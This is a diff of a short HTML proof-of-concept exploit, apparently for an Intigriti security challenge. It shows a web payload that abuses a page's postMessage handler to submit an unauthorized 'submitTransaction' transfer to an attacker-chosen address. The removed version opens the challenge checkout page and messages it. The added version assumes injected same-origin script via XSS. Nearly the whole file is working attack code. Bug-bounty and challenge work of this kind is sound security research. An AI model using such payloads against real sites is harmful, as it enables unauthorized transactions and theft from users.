@@ -1,21 +1,24 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <meta charset="UTF-8">
+  <title>PoC – XSS to Unauthorized Transaction</title>
+</head>
 <body>
-<script>
-const target = "https://challenge-0126.intigriti.io/checkout.html?currency=1337Coin&price=150";
+  <h2>XSS → postMessage → Transaction PoC</h2>
 
-const win = window.open(target, "_blank");
+  <script>
+    // This code assumes it is running in target.com origin
+    // due to an XSS vulnerability
 
-setTimeout(() => {
-  win.postMessage({
-    type: "submitTransaction",
-    transaction: {
-      currency: "1337Coin",
-      amount: 1337,
-      toAddress: "1b70cd087fb68bb311210cc05b994ee08e"
-    }
-  }, "*");
-}, 3000);
-</script>
+    window.postMessage({
+      type: 'submitTransaction',
+      transaction: {
+        toAddress: '19917bff10ad06f392de3780d947aa9191',
+        currency: '1337COIN',
+        amount: '99'
+      }
+    }, '*');
+  </script>
 </body>
 </html>
